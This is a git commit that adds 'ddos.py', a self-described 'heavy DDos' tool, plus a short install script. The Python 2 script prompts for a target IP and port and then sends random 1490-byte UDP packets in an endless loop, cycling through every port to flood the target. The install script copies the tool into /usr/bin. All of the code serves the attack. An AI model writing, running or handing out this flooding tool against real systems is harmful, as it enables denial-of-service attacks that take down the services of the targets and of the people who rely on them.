509c363720693b8439d5e40f573e59ac1de5017c
rehmanazhar922 <71656350+rehmanazhar922@users.noreply.github.com>
2021-04-14 06:48:24 -0400

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,50 @@
+import sys
+import os
+import time
+import socket
+import random
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
+os.system("clear")
+os.system("figlet heavy DDos ")
+print
+print "Author   : cybersec922 & rehmanazhar922"
+print "You Tube : https://www.youtube.com/channel/UCeLj2WCady6CAvOXxn6xwiQ"
+print "github   : https://github.com/rehmanazhar922/"
+print 
+print
+ip = raw_input("IP Target : ")
+port = input("Port       : ")
+
+os.system("clear")
+os.system("figlet Attack Starting")
+print "[                    ] 0% "
+time.sleep(0.2)
+print "[=====               ] 25%"
+time.sleep(0.2)
+print "[==========          ] 50%"
+time.sleep(0.2)
+print "[===============     ] 75%"
+time.sleep(0.2)
+print "[====================] 100%"
+time.sleep(0.2)
+sent = 0
+while True:
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
---
+++ install.h
@@ -0,0 +1,5 @@
+sudo cp ddos /usr/bin
+mkdir ~/tools
+cp ddos.py ~/tools
+notify-send "ddos installation" "installed :) "
+figlet installed
